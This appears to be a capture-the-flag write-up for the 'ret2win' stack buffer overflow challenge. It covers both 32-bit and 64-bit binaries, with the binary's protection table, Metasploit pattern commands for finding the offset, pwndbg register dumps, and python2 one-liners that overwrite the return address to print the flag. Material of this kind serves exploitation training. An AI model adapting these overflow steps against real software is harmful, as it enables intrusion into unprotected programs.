# Ret2Win

Objective:

Overflow buffer, and return to Ret2Win function, printing flag.txt

Security:

|RELRO|STACK CANARY|NX|PIE|RPATH|RUNPATH|Symbols|FORTIFY|Fortified|Fortifiable|FILE|ASLR|
|-|-|-|-|-|-|-|-|-|-|-|-|
|Partial RELRO|No canary found|NX enabled|No PIE|No RPATH|No RUNPATH|72) Symbols|No|0|3|ret2win32|ASLR Disabled|

### 32 Bit

Location of Ret2Win:

```
0x804862c <ret2win>:	0x83e58955
```
Manual Exploit:

```
msf-pattern_create -l 100           # Invalid address 0x35624134, which is A4b5
msf-pattern_offset -l 100 -q A4b5   # 44
python2 -c "import struct;print('A'*44 + struct.pack('I', 0x804862c))" | ./ret2win32
```

Automated Exploits:

`manualpwn-exploit_32.py`

`autopwn-exploit_32.py`

### 64 bit

Difference between 32 bit & 64 bit programs:

- If address does not exist/not in value range, program will not return and crash at that instruction

    64 bit Fuzzing:

    ```
    ─────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────
     RAX  0xb
     RBX  0x400780 (__libc_csu_init) ◂— push   r15
     RCX  0x7ffff7ec2603 (write+19) ◂— cmp    rax, -0x1000 /* 'H=' */
     RDX  0x0
     RDI  0x7ffff7fa5670 (_IO_stdfile_1_lock) ◂— 0x0
     RSI  0x7ffff7fa3743 (_IO_2_1_stdout_+131) ◂— 0xfa5670000000000a /* '\n' */
     R8   0xb
     R9   0x7ffff7fdc1f0 (_dl_fini) ◂— push   rbp
     R10  0xfffffffffffffb87
     R11  0x246
     R12  0x4005b0 (_start) ◂— xor    ebp, ebp
     R13  0x0
     R14  0x0
     R15  0x0
     RBP  0x4132624131624130 ('0Ab1Ab2A')
     RSP  0x7fffffffdc08 ◂— 0x3562413462413362 ('b3Ab4Ab5')
     RIP  0x400755 (pwnme+109) ◂— ret    
    ───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────
     ► 0x400755 <pwnme+109>    ret    <0x3562413462413362>
    ```

    32 bit fuzzing:

    ```
    ─────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────
     EAX  0xb
     EBX  0x0
     ECX  0xffffffff
     EDX  0xffffffff
     EDI  0x8048430 (_start) ◂— xor    ebp, ebp
     ESI  0x1
     EBP  0x62413362 ('b3Ab')
     ESP  0xffffcde0 ◂— 'Ab6Ab7Ab'
     EIP  0x35624134 ('4Ab5')
    ───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────
    Invalid address 0x35624134
    ```

Location of Ret2Win:

```
0x400756 <ret2win>:	0xe5894855
```

Manual Exploit:

```
msf-pattern_create -l 100           
msf-pattern_offset -l 100 -q b3Ab   # 40 (string after -q flag has to be 4 chars, use the first 4 chars from b3Ab4Ab5)
python2 -c "import struct;print('A'*40 + struct.pack('Q', 0x400756))" | ./ret2win
python2 -c "import struct;print('A'*40 + '\x56\x07\x40\x00\x00\x00\x00\x00')" | ./ret2win
```

Automated Exploits:

`manualpwn-exploit_64.py`

`autopwn-exploit_64.py`

### Other things:

- For the `autopwn-*.py` exploit scripts, you can run it with a `GDB` argument (i.e. `python3 autopwn-* GDB`) and the `gdbscript` variable within the exploit script will run in another terminal as well!

- Set `context.log_level` to 'debug' to get more details